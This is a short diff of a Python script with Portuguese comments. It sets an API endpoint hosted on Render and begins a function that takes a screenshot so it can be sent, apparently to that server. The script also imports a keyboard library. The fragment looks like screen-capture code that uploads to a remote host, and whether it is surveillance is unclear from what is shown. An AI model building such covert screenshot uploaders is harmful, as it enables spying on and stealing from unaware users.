@@ -5,7 +5,7 @@ import keyboard
 import requests
 from io import BytesIO
 
-API_URL = "  "  # Seu endpoint no Render
+API_URL = "https://blah-blah-blah-siteeh.onrender.com/"  # Seu endpoint no Render
 
 def tirar_e_enviar():
     screenshot = pyautogui.screenshot()
